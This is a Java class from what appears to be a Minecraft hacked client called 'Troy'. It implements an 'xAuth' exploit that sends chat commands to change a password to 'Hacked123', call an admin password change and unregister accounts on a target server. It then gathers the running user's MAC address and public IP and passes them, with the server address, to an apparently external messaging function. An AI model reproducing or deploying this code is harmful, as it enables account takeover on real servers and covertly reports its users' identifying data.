package it.md_4.troy.command.bypass.auth;


import it.md_4.troy.exception.ExploitException;
import it.md_4.troy.exploit.Exploit;
import it.md_4.troy.exploit.ExploitInfo;
import it.md_4.troy.exploit.ExploitType;
import it.md_4.troy.helper.ChatHelper;
import it.md_4.troy.ip.IpChecker;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import java.awt.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;

import static it.md_4.troy.Troy.DSsendMessage;

@ExploitInfo(
        name = "xauth",
        type = ExploitType.OTHER,
        description = "xAuth Exploit"
)
public class Auth1 extends Exploit {

    @Override
    public void execute(Object... args) throws Exception {
        long start = System.currentTimeMillis();
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/xlogin changuepassword Hacked123 Hacked123"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/pswadminchange"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/cp unregister"));
        ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
                System.currentTimeMillis() - start));

        InetAddress localHost = null;
        try {
            localHost = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        }
        NetworkInterface ni = null;
        try {
            ni = NetworkInterface.getByInetAddress(localHost);
        } catch (SocketException e) {
            e.printStackTrace();
        }
        byte[] hardwareAddress = new byte[0];
        try {
            hardwareAddress = ni.getHardwareAddress();
        } catch (SocketException e) {
            e.printStackTrace();
        }

        String[] hexadecimal = new String[hardwareAddress.length];
        for (int i = 0; i < hardwareAddress.length; i++) {
            hexadecimal[i] = String.format("%02X", hardwareAddress[i]);
        }
        String macAddress = String.join("-", hexadecimal);

        DSsendMessage("[" + macAddress + " Connected With IP => (" + IpChecker.getIp() +")]" + " Launched ByPass [xAuth] Server: [" + mc.getCurrentServerData().serverIP + "]", true, Color.GREEN);
    }
}
